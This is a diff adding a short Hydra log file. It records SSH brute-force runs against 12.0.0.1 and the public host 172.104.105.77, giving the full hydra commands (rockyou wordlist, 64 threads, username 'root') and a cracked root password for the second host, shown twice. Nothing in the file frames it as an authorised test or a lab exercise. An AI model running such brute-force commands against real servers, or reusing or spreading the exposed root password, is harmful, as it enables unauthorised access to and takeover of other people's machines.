@@ -1,0 +1,4 @@
+# Hydra v9.5 run at 2024-09-27 22:59:32 on 12.0.0.1 ssh (hydra -l zero -P rockyou.txt -t 64 -vV -o output.log -I ssh://12.0.0.1)
+# Hydra v9.5 run at 2024-09-28 12:14:21 on 172.104.105.77 ssh (hydra -l root -P rockyou.txt -t 64 -vV -o output.log -I ssh://172.104.105.77:22)
+[22][ssh] host: 172.104.105.77   login: root   password: Cmonster2006!@#!@#!@#
+[22][ssh] host: 172.104.105.77   login: root   password: Cmonster2006!@#!@#!@#
